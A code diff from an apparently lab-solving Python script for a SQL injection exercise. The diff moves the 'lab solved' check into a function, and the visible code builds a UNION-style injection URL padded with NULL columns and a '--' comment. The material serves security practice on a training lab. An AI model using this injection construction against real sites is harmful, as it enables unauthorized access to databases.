@@ -30,11 +30,13 @@ def find_rows():
                 for y in range(x-1):
                     nulls += "NULL,"
                 break
+def pass_lab_check():
+    r = session.get(url=final_attack)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("lab passed")
 
 find_rows()
 
 final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls[:len(nulls)-1]+"--"
 print(final_attack)
-r = session.get(url=final_attack)
-if "Congratulations, you solved the lab!" in r.text:
-    print("lab passed")
+pass_lab_check()
